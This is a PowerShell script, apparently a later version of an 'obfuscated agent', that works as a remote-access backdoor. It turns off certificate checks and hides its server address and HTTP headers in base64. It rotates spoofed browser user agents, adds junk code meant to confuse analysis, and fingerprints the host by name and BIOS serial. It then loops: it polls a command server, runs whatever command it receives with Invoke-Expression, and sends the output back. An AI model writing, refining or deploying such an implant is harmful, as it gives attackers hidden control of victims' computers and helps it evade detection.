# --- SAME AS V3 ---

# --- ADVANCED OBFUSCATED AGENT ---
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function g9q($s){
    
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
}
function z1r($m){if($true){return}}
function x2y($msg){if($env:DEBUG -eq "1"){Write-Host $msg}}
function y7t($msg){if($true){Write-Host $msg}}

$A1=[System.Guid]::NewGuid().ToString();z1r $A1 # Junk code

$h1=g9q "aHR0cHM6Ly8xMjcuMC4wLjE6ODA4MA==" # https://127.0.0.1:8080
$d1="$($env:COMPUTERNAME)_$((Get-WmiObject Win32_BIOS).SerialNumber)"
$uA=@(
    "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIFNhZmFyaS81MzcuMzY=",
    "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIFNhZmFyaS81MzcuMzYgRWRnLzEyNC4wLjI0Nzg4Ljgw",
    "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTI2LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTI2LjA=",
    "TWljcm9zb2Z0IEJJVFMvNy44",
    "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28=",
    "TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgMTAuMDsgV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNi4wKQ==",
    "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQ7IHJ2OjQ1LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDUuMA=="
)
function r4d { param($a) return g9q ($uA | Get-Random) }
$hD=@{
    "User-Agent" = r4d
    "Accept" = g9q "YXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyogOyBxPTAuMDE="
    "Accept-Language" = g9q "ZW4tVVMsZW47cT0wLjk="
    "Referer" = g9q "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8="
}

$regB=@{device_id=$d1}|ConvertTo-Json
try{
    Invoke-RestMethod -Uri ("$h1/register") -Method Post -Body $regB -ContentType "application/json" -Headers $hD
}catch{y7t "[AGENT] Registration failed."}

while($true){
    try{
        $p1=Invoke-WebRequest -Uri ("$h1/ping") -Method Get -TimeoutSec 5 -Headers $hD
        if($p1.StatusCode -ne 200){y7t "Relay not reachable. Exiting agent.";exit}
    }catch{y7t "Relay not reachable. Exiting agent.";exit}

    $b2=@{device_id=$d1}|ConvertTo-Json
    $hD=@{
        "User-Agent" = r4d
        "Accept" = g9q "YXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyogOyBxPTAuMDE="
        "Accept-Language" = g9q "ZW4tVVMsZW47cT0wLjk="
        "Referer" = g9q "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8="
    }
    try{
        $r2=Invoke-RestMethod -Uri ("$h1/poll") -Method Post -Body $b2 -ContentType "application/json" -Headers $hD
        $cM=$r2.command
        if($cM){
            try{
                $rS=Invoke-Expression $cM 2>&1 | Out-String
            }catch{
                $rS="Error: $($_.Exception.Message)"
            }
            $rB=@{device_id=$d1;r2=$rS}|ConvertTo-Json
            Invoke-RestMethod -Uri ("$h1/result") -Method Post -Body $rB -ContentType "application/json" -Headers $hD | Out-Null
        }
    }catch{}
    Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 30)
    z1r $A1 # More junk code
}